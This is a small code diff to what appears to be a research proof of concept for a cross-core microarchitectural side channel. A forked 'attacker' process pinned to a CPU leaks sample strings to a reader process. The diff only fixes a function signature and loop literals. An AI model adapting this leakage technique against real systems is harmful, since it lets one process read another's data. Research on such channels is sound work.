@@ -10,13 +10,13 @@
 
 #define CYCLE_LENGTH 6000000
 
-void attacker_write_char(int cpu, void *mem){
+void attacker_write_char(int cpu){
     set_processor_affinity(cpu);
 
     char* leak_candidate_string = sample_strings[rand() % sample_string_count];
     int leak_pos = 0;
 
-    while(true){
+    while(1){
         if (leak_pos >= strlen(leak_candidate_string))
             break;
 
@@ -34,7 +34,7 @@ void attacker_write_char(int cpu, void *mem){
             :::"eax");
 
             //TODO: Wait for the reader to signal CPUID, then continuing
-            while (true) {}
+            while (1) {}
         }
     }
 }
@@ -81,7 +81,7 @@ int main(int argc, char **args) {
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
     byte_32 = get_byte_32();
     pid = fork();
-    if (!pid) attacker_write_char(0x80000002ul, writer_cpu);
+    if (!pid) attacker_write_char(writer_cpu);
     attacker_read_char(reader_cpu, 50);
     munmap(mem-1, _page_size * 257);
     usleep(10000);
